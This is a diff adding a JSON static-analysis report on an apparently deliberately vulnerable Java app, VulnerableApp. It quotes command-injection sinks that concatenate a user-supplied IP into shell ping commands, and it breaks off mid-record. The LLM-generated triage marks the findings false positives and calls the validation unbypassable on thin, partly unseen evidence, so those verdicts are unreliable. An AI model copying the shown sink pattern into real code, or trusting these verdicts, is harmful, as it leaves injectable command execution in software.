@@ -1,0 +1,3147 @@
+{
+  "scan_metadata": {
+    "repo": "VulnerableApp",
+    "timestamp": "2026-08-19T22:40:59",
+    "raw_findings": 106,
+    "unique_findings": 33,
+    "per_rule_stats": [
+      {
+        "rule_id": "injection",
+        "source_nodes_matched": 208,
+        "sink_candidates_matched": 12,
+        "findings_returned": 48
+      },
+      {
+        "rule_id": "ssrf",
+        "source_nodes_matched": 202,
+        "sink_candidates_matched": 2,
+        "findings_returned": 12
+      },
+      {
+        "rule_id": "deserialization",
+        "source_nodes_matched": 243,
+        "sink_candidates_matched": 0,
+        "findings_returned": 0
+      },
+      {
+        "rule_id": "path_traversal",
+        "source_nodes_matched": 202,
+        "sink_candidates_matched": 25,
+        "findings_returned": 1
+      },
+      {
+        "rule_id": "xxe",
+        "source_nodes_matched": 41,
+        "sink_candidates_matched": 6,
+        "findings_returned": 45
+      }
+    ]
+  },
+  "findings": [
+    {
+      "category": "injection",
+      "subtype": "CWE-78",
+      "path": [
+        {
+          "code": "@RequestParam(IP_ADDRESS) String ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 214
+        },
+        {
+          "code": "ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 227
+        },
+        {
+          "code": "String ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 41
+        },
+        {
+          "code": "'ping -n 2 ' + ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "new String[] { 'cmd', '/c', 'ping -n 2 ' + ipAddress }",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "<operator>.arrayInitializer",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "$obj1",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "new ProcessBuilder(new String[] { 'cmd', '/c', 'ping -n 2 ' + ipAddress }).redirectErrorStream(true)",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<STR>+<VAR_3>",
+        "<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}",
+        "<<VAR_5>>.<ATTR_1>",
+        "$<VAR_6>",
+        "<<VAR_7>>",
+        "<VAR_4><FUNC_2>(<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}).<ATTR_2>(<VAR_8>)"
+      ],
+      "fingerprint": "1129f45f792734aad1746b063b30cdbf6eda2bf596c5019c33b999fede5cc862",
+      "context_hash": "8ebcaf5642868be5ba8cf6b018e2690ba8d2c7365c6649d3639f2f2b7fccb0dd",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 214,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 141,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 107,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 178,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 214,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 81,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 237,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 141,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 81,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 237,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 178,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 107,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "Command Injection",
+      "cwe": "CWE-78",
+      "source": "@RequestParam(IP_ADDRESS) String ipAddress",
+      "sink": "new ProcessBuilder(new String[]{\"cmd\",\"/c\",\"ping -n 2 \"+ipAddress})",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The ipAddress parameter is validated by a strict whitelist regex (IP_ADDRESS_PATTERN) that only permits valid IPv4 dotted\u2011decimal addresses (0\u2011255). This whitelist prevents any characters that could alter the command line (e.g., spaces, pipes, ampersands). Additional check ensures the request URL does not contain encoded pipe characters. Because the validation is comprehensive and not bypassable, the concatenated command cannot be manipulated for injection, making the reported issue a false positive.",
+      "evidence": [
+        "Source: @RequestParam(IP_ADDRESS) String ipAddress at line 214",
+        "Validator: Supplier<Boolean> validator checks IP_ADDRESS_PATTERN (IPv4 regex) and request URL for \"%7C\" at line 224",
+        "Sink: ProcessBuilder invoked with \"cmd\",\"/c\",\"ping -n 2 \"+ipAddress at line 53",
+        "The regex only allows digits and dots, disallowing any command\u2011control characters"
+      ],
+      "poc": "N/A",
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier3_deep_llm",
+      "latency_ms": 3231,
+      "retry_count": 0,
+      "parse_success": true,
+      "approval_state": "APPROVED"
+    },
+    {
+      "category": "injection",
+      "subtype": "CWE-78",
+      "path": [
+        {
+          "code": "@RequestParam(IP_ADDRESS) String ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 107
+        },
+        {
+          "code": "ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 118
+        },
+        {
+          "code": "String ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 41
+        },
+        {
+          "code": "'ping -c 2 ' + ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "new String[] { 'sh', '-c', 'ping -c 2 ' + ipAddress }",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "<operator>.arrayInitializer",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "$obj0",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "new ProcessBuilder(new String[] { 'sh', '-c', 'ping -c 2 ' + ipAddress })",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<STR>+<VAR_3>",
+        "<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}",
+        "<<VAR_5>>.<ATTR_1>",
+        "$<VAR_6>",
+        "<VAR_4><FUNC_2>(<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>})"
+      ],
+      "fingerprint": "c8f1bebde2ed48c9fa56e6117734688591cdf07762c9fd4bed6a7fd5fc121bf3",
+      "context_hash": "8da249ea5cd022b93dffe455406f4eba68ba92d18d6b14531c75cdea36bb1380",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 107,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 107,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 81,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 81,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 214,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 141,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 237,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 178,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 141,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 178,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 237,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 214,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "Command Injection",
+      "cwe": "CWE-78",
+      "source": "@RequestParam(IP_ADDRESS) String ipAddress",
+      "sink": "new ProcessBuilder(new String[]{\"sh\",\"-c\",\"ping -c 2 \"+ipAddress})",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The request parameter ipAddress is validated against a strict IPv4 regex (IP_ADDRESS_PATTERN) before being used. The validator supplier (line 110) returns true only when the input fully matches the pattern, which disallows any characters that could break out of the ping command. Consequently, attacker\u2011controlled input cannot inject additional commands, making the reported injection a false positive.",
+      "evidence": [
+        "Line 38\u201139 define a regex that matches only valid IPv4 addresses (0\u2011255 octets).",
+        "The validator supplier (line 110, not shown) uses this pattern to set isValid.",
+        "The ProcessBuilder is only invoked when isValid is true (line 44\u201148).",
+        "If isValid is false, the method does not execute the command."
+      ],
+      "poc": "N/A",
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier3_deep_llm",
+      "latency_ms": 2297,
+      "retry_count": 0,
+      "parse_success": true
+    },
+    {
+      "category": "injection",
+      "subtype": "CWE-78",
+      "path": [
+        {
+          "code": "@RequestParam(IP_ADDRESS) String ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 141
+        },
+        {
+          "code": "ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 154
+        },
+        {
+          "code": "String ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 41
+        },
+        {
+          "code": "'ping -c 2 ' + ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "new String[] { 'sh', '-c', 'ping -c 2 ' + ipAddress }",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "<operator>.arrayInitializer",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "$obj0",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "new ProcessBuilder(new String[] { 'sh', '-c', 'ping -c 2 ' + ipAddress }).redirectErrorStream(true)",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        },
+        {
+          "code": "new ProcessBuilder(new String[] { 'sh', '-c', 'ping -c 2 ' + ipAddress }).redirectErrorStream(true).start()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 48
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<STR>+<VAR_3>",
+        "<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}",
+        "<<VAR_5>>.<ATTR_1>",
+        "$<VAR_6>",
+        "<<VAR_7>>",
+        "<VAR_4><FUNC_2>(<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}).<ATTR_2>(<VAR_8>)",
+        "<VAR_4><FUNC_2>(<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}).<ATTR_2>(<VAR_8>).<ATTR_3>()"
+      ],
+      "fingerprint": "4d5a458fce52254a08a3fa979e5e3189650449442d11f83009a20adb2dcfb8bd",
+      "context_hash": "bd95d5f594164384272c358660cde7a2750e9e75d74f9563349667ecf8e74a4c",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 141,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 214,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 237,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 178,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 237,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 107,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 214,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 81,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 107,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 81,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 141,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 53
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 178,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 48
+        }
+      ],
+      "verdict": "FALSE_POSITIVE",
+      "verdict_confidence": 0.92,
+      "vulnerability_type": "Command Injection",
+      "cwe": "CWE-78",
+      "source": "@RequestParam(IP_ADDRESS) String ipAddress",
+      "sink": "new ProcessBuilder(new String[]{\"sh\",\"-c\",\"ping -c 2 \"+ipAddress}).start()",
+      "data_flow_valid": true,
+      "sanitization_present": true,
+      "reasoning": "The ipAddress parameter is validated by a strict IPv4 whitelist regex (IP_ADDRESS_PATTERN) and an additional check that the request URL does not contain an encoded semicolon (%3B). This whitelist ensures only numeric octets and dots can reach the ProcessBuilder, eliminating any possibility of command injection via shell metacharacters. Consequently the reported command injection is a false positive.",
+      "evidence": [
+        "Source: @RequestParam(IP_ADDRESS) String ipAddress is attacker-controlled.",
+        "Validator supplier checks IP_ADDRESS_PATTERN.matches(ipAddress) and ensures requestEntity.getUrl() does not contain \"%3B\".",
+        "If validator returns true, ipAddress is concatenated into the ping command string passed to ProcessBuilder.",
+        "ProcessBuilder executes \"sh -c ping -c 2 <ipAddress>\" without further user input."
+      ],
+      "poc": "N/A",
+      "requires_dynamic_validation": false,
+      "validation_tier": "tier2_fast_llm",
+      "latency_ms": 13889,
+      "retry_count": 0,
+      "parse_success": true
+    },
+    {
+      "category": "injection",
+      "subtype": "CWE-78",
+      "path": [
+        {
+          "code": "@RequestParam(IP_ADDRESS) String ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 141
+        },
+        {
+          "code": "ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 154
+        },
+        {
+          "code": "String ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 41
+        },
+        {
+          "code": "'ping -n 2 ' + ipAddress",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "new String[] { 'cmd', '/c', 'ping -n 2 ' + ipAddress }",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "<operator>.arrayInitializer",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "$obj1",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "<empty>",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "new ProcessBuilder(new String[] { 'cmd', '/c', 'ping -n 2 ' + ipAddress }).redirectErrorStream(true)",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "new ProcessBuilder(new String[] { 'cmd', '/c', 'ping -n 2 ' + ipAddress }).redirectErrorStream(true).start()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 53
+        },
+        {
+          "code": "process",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 52
+        },
+        {
+          "code": "process = new ProcessBuilder(new String[] { 'cmd', '/c', 'ping -n 2 ' + ipAddress }).redirectErrorStream(true).start()",
+          "file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "line": 52
+        }
+      ],
+      "chain_id": null,
+      "anonymized_path": [
+        "@<FUNC_1>(<VAR_1>)<VAR_2><VAR_3>",
+        "<VAR_3>",
+        "<VAR_2><VAR_3>",
+        "<STR>+<VAR_3>",
+        "<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}",
+        "<<VAR_5>>.<ATTR_1>",
+        "$<VAR_6>",
+        "<<VAR_7>>",
+        "<VAR_4><FUNC_2>(<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}).<ATTR_2>(<VAR_8>)",
+        "<VAR_4><FUNC_2>(<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}).<ATTR_2>(<VAR_8>).<ATTR_3>()",
+        "<VAR_9>",
+        "<VAR_9>=<VAR_4><FUNC_2>(<VAR_4><VAR_2>[]{<STR>,<STR>,<STR>+<VAR_3>}).<ATTR_2>(<VAR_8>).<ATTR_3>()"
+      ],
+      "fingerprint": "992e4dfb4230c485e2c7c622de513077ca52692f4ee7c814dcc03cae2205ae72",
+      "context_hash": "b9f1523d2c04567da394aa463f1c704278c2c42039efb21dbae3f16bb8ed0bde",
+      "instances": [
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 141,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 52
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 237,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 47
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 214,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 52
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 214,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 47
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 178,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 47
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 178,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 52
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 237,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 52
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 107,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "sink_line": 52
+        },
+        {
+          "repo": "unknown",
+          "source_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
+          "source_line": 81,
+          "sink_file": "src\\main\\java\\org\\sasanlabs\\service\\vulnerability\\commandInjection\\CommandInjection.java",
